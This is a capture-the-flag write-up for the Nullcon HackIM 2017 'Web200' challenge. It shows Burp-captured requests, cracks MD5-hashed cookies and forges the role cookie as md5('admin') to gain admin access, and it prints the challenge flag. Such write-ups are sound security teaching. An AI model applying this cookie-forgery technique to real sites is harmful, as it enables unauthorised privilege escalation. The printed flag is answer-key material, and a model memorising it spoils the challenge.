-----
# Web 2 (200 pts)
# CTF: Nullcon HackIM 2017
# URL: http://ctf.nullcon.net/
# TWI: https://twitter.com/nullcon
# CAT: web

-----
There are two kinds of people in this world. One with all the privileges and the others. 
Can you get the flag by eating some British biscuit?

http://54.152.19.210/web200/

-----
Hints provided via Twitter:
```
HINT:- Web200 I want some cookies :) #nullcon #hackIM #CTF
HINT:- Web200 Its all in the details and patterns #nullcon #hackIM #CTF
```

-----
## (1) RECONNAISSANCE

In order to perform the reconnaissance phase, we will use a standard browser configured to use Burp Proxy as an intermediate web proxy.

When accessing the site, we get a form containing two fields (login/password), a 'Sign In' button and a 'Sign Up' button:

REQUEST 1:
```
GET /web200/ HTTP/1.1
Host: 54.152.19.210
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```

RESPONSE 1:
```
HTTP/1.1 200 OK
Server: nginx/1.10.0 (Ubuntu)
Date: Sat, 11 Feb 2017 21:34:04 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 963

<!DOCTYPE html>
<html >
  <head>
    <meta charset="UTF-8">
<title>HackIM'17 - Web200</title>
          <link rel="stylesheet" href="css/style.css">
  </head>

  <body>

<form method="post" name="loginfrm" id="loginfrm" action="home.php">
<div class="box">
<h1>HackIM'17 - Web200</h1>
<h3>Login</h3>
<input type="username" id="password" name="username" value="username" onFocus="field_focus(this, 'username');" onblur="field_blur(this, 'username');" class="email" />
<input type="password" id="password" name="password" value="password" onFocus="field_focus(this, 'password');" onblur="field_blur(this, 'password');" class="email" />
  
<a href="#" onclick="login()"><div class="btn">Sign In</div></a> <!-- End Btn -->

<a href="register.php"><div id="btn2">Sign Up</div></a> <!-- End Btn2 -->
 <br />
  <span id="msg" style="color:red">
  
  </span> 
</div> <!-- End Box -->
  
</form>

    
        <script src="js/index.js"></script>
   
  </body>
</html>
```

If we try a sign-up using 'test/test', a POST request is generated:

REQUEST 2:
```
POST /web200/home.php HTTP/1.1
Host: 54.152.19.210
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://54.152.19.210/web200/index.php?msg=1
Cookie: PHPSESSID=bk56evrs7imuof9m8nsiel4hk2
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=test&password=test
```

We get an URL redirection (code 302):

RESPONSE 2:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.10.0 (Ubuntu)
Date: Sat, 11 Feb 2017 21:40:02 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: u=351e766803098f6bcd4621d373cade4e832627b4f6
Set-Cookie: r=351e766803d63c7ede8cb1e1c8db5e51c63fd47cff
Location: home.php
Content-Length: 243

<html>
<head>
  <title>HackIM'17 - Web200</title>
<link rel="stylesheet" href="css/home.css">
</head>
<body>
  <h1>HackIM'17 - Web200</h1>
<ul>
  <li>
    Home
  </li>
   <a href="logout.php"><li>
    Logout
  </li></a>

</ul>
</body>
</html>
```

After the redirection, a GET request is automatically generated, using a session cookie (PHPSESSID) and two other cookies (u, r) which may be used for authentication purposes:

REQUEST 3:
```
GET /web200/home.php HTTP/1.1
Host: 54.152.19.210
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://54.152.19.210/web200/index.php?msg=1
Cookie: u=351e766803098f6bcd4621d373cade4e832627b4f6; r=351e766803d63c7ede8cb1e1c8db5e51c63fd47cff; PHPSESSID=bk56evrs7imuof9m8nsiel4hk2
Connection: close
```

In the new response, the server reports that we are a limited user:

RESPONSE 3:
```
HTTP/1.1 200 OK
Server: nginx/1.10.0 (Ubuntu)
Date: Sat, 11 Feb 2017 21:40:08 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 334

<html>
<head>
  <title>HackIM'17 - Web200</title>
<link rel="stylesheet" href="css/home.css">
</head>
<body>
  <h1>HackIM'17 - Web200</h1>
<ul>
  <li>
    Home
  </li>
   <a href="logout.php"><li>
    Logout
  </li></a>

</ul>
<h1>Welcome limited user!</h1><h3>You do not possess the necessary powers. Try harder!</h3></body>
</html>
```

We try again with another username/password combination: test2/test2 (request 4, not shown). We get a URL redirection again (response 4, not shown) but this time the new GET request contains no authentication cookies:

REQUEST 5:
```
GET /web200/index.php?msg=1 HTTP/1.1
Host: 54.152.19.210
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://54.152.19.210/web200/index.php?msg=3
Cookie: PHPSESSID=bk56evrs7imuof9m8nsiel4hk2
Connection: close
```

Now the server reports that the username/password is invalid:

RESPONSE 5:
```
HTTP/1.1 200 OK
Server: nginx/1.10.0 (Ubuntu)
Date: Sat, 11 Feb 2017 21:43:54 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 992

<!DOCTYPE html>
<html >
  <head>
    <meta charset="UTF-8">
<title>HackIM'17 - Web200</title>
          <link rel="stylesheet" href="css/style.css">

  </head>

  <body>

<form method="post" name="loginfrm" id="loginfrm" action="home.php">
<div class="box">
<h1>HackIM'17 - Web200</h1>
<h3>Login</h3>
<input type="username" id="password" name="username" value="username" onFocus="field_focus(this, 'username');" onblur="field_blur(this, 'username');" class="email" />
  
<input type="password" id="password" name="password" value="password" onFocus="field_focus(this, 'password');" onblur="field_blur(this, 'password');" class="email" />
  
<a href="#" onclick="login()"><div class="btn">Sign In</div></a> <!-- End Btn -->

<a href="register.php"><div id="btn2">Sign Up</div></a> <!-- End Btn2 -->
 <br />
  <span id="msg" style="color:red">
  Invalid username or password.
  </span> 
</div> <!-- End Box -->
  
</form>

    
        <script src="js/index.js"></script>
   
  </body>
</html>
```

-----
## (2) ANALYSIS OF THE COOKIES

So there seems to be valid users and invalid users, as expected. However, for the valid users we always get limited access. We try several standard username/password combinations in order to determine a set of valid users and analyze the authentication cookies generated by the server for them:

admin
u=351e76680321232f297a57a5a743894a0e4a801fc3 
r=351e766803d63c7ede8cb1e1c8db5e51c63fd47cff

test/test
u=351e766803098f6bcd4621d373cade4e832627b4f6
r=351e766803d63c7ede8cb1e1c8db5e51c63fd47cff	

root/root
u=351e76680363a9f0ea7bb98050796b649e85481845
r=351e766803d63c7ede8cb1e1c8db5e51c63fd47cff	

In the three cases we get the same message 'Welcome limited user! You do not possess the necessary powers. Try harder!'. A rapid analysis of the cookies reveals two interesting things:

- All the cookies start with the same string: 351e766803.
- The 'r' cookie is identical for all the users.

Then we decide to create a new user (test400/test400) by means of using the 'Sign In' button. Once registered, we try to log in with him and get the following cookies:

test400/test400
u=351e7668037e06311f299257940a65552823d6f22c
r=351e766803d63c7ede8cb1e1c8db5e51c63fd47cff

The 'r' cookie is still the same.

Using the repeater function of Burp Proxy, we conclude that we get limited privileges if we present the cookie 'r=351e766803d63c7ede8cb1e1c8db5e51c63fd47cff' to the server, no matter which is the value of the 'u' cookie.

On the other hand, if we strip the string '351e766803' from the cookies, the remaining string seems to be a MD5 hash. In the case of the 'r' cookie, the hash is 'd63c7ede8cb1e1c8db5e51c63fd47cff'.

We try a Rainbow Table attack from Crackstation (https://crackstation.net/) and get the following:

d63c7ede8cb1e1c8db5e51c63fd47cff -> limited

On the other hand, if we perform the same attack against the hash which is the remainder of the 'u' cookies, we get:

21232f297a57a5a743894a0e4a801fc3 -> admin -> coincident with the username
098f6bcd4621d373cade4e832627b4f6 -> test -> coincident with the username

So the 'r' cookie, related to the string 'limited', seems to grant the limited access. The 'u' cookie is built using the username presented to the server. Then, the 'r' cookie could give the privilege level with independence of the presented username.

In order to check this hypothesis, we will try several values for the 'r' cookie, using strings potentially adequate to provide more privileges.

-----
## (3) COOKIE MANIPULATION ATTACK

The Repeater function of Burp Proxy allows to intercept cookies and modify their value before sending them in a request to the server. We try the following values for the 'r' cookie:
```
$ echo -n "full" | md5sum
e9dc924f238fa6cc29465942875fe8f0  -
```
u=351e76680321232f297a57a5a743894a0e4a801fc3
r=351e766803e9dc924f238fa6cc29465942875fe8f0
```
$ echo -n "privileged" | md5sum
bd638b36d2814f488c1497cfe49eceea  -
```
u=351e76680321232f297a57a5a743894a0e4a801fc3
r=351e766803bd638b36d2814f488c1497cfe49eceea
```
$ echo -n "root" | md5sum
63a9f0ea7bb98050796b649e85481845  -
```
u=351e76680363a9f0ea7bb98050796b649e85481845
r=351e76680363a9f0ea7bb98050796b649e85481845
```
$ echo -n "unlimited" | md5sum
958f470d0b1c8fb2b9e62b48e8903299  -
```
u=351e76680363a9f0ea7bb98050796b649e85481845
r=351e766803958f470d0b1c8fb2b9e62b48e8903299
```
$ echo -n "complete" | md5sum
d9a22d7a8178d5b42a8750123cbfe5b1  -
```
u=351e76680363a9f0ea7bb98050796b649e85481845
r=351e766803d9a22d7a8178d5b42a8750123cbfe5b1
```
$ echo -n "total" | md5sum
fbb44b4487415b134bce9c790a27fe5e  -
```
u=351e76680363a9f0ea7bb98050796b649e85481845
r=351e766803fbb44b4487415b134bce9c790a27fe5e
```
$ echo -n "powered" | md5sum
e5830ea37baddded0c03777c3a2285e7  -
```
u=351e76680363a9f0ea7bb98050796b649e85481845
r=351e766803e5830ea37baddded0c03777c3a2285e7
```
$ echo -n "administrator" | md5sum
200ceb26807d6bf99fd6f4f0d1ca54d4 
```
u=351e76680363a9f0ea7bb98050796b649e85481845
r=351e766803200ceb26807d6bf99fd6f4f0d1ca54d4
```
$ echo -n "rooted" | md5sum
ad8058a084bee8a14a6f23efa52d39d0  -
```
u=351e76680363a9f0ea7bb98050796b649e85481845
r=351e766803ad8058a084bee8a14a6f23efa52d39d0
```
$ echo -n "absolute" | md5sum
dc4d53aa0d117d8b189b36d161af4e96  -
```
u=351e76680363a9f0ea7bb98050796b649e85481845
r=351e766803dc4d53aa0d117d8b189b36d161af4e96
```
$ echo -n "master" | md5sum
eb0a191797624dd3a48fa681d3061212  -
```
u=351e76680363a9f0ea7bb98050796b649e85481845
r=351e766803eb0a191797624dd3a48fa681d3061212
```
$ echo -n "superuser" | md5sum
0baea2f0ae20150db78f58cddac442a9 
```
u=351e76680363a9f0ea7bb98050796b649e85481845
r=351e7668030baea2f0ae20150db78f58cddac442a9
```
$ echo -n "super" | md5sum
1b3231655cebb7a1f783eddf27d254ca  -
```
u=351e76680363a9f0ea7bb98050796b649e85481845
r=351e7668031b3231655cebb7a1f783eddf27d254ca

An finally, for the string 'admin':
```
$ echo -n "admin" | md5sum
21232f297a57a5a743894a0e4a801fc3  -
```
u=351e76680321232f297a57a5a743894a0e4a801fc3 -> admin
r=351e76680321232f297a57a5a743894a0e4a801fc3 -> admin

We get the full access from the server and the value of the flag:
```
HTTP/1.1 200 OK
Server: nginx/1.10.0 (Ubuntu)
Date: Sun, 12 Feb 2017 01:38:11 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 342

<html>
<head>
  <title>HackIM'17 - Web200</title>
<link rel="stylesheet" href="css/home.css">
</head>
<body>
  <h1>HackIM'17 - Web200</h1>
<ul>
  <li>
    Home
  </li>
   <a href="logout.php"><li>
    Logout
  </li></a>

</ul>
<h1>Welcome admin user!</h1><h3>Congratulations! The flag is: bb6df1e39bd297a47ed0eeaea9cac7ee</h3></body>
</html>
```
The flag is: bb6df1e39bd297a47ed0eeaea9cac7ee



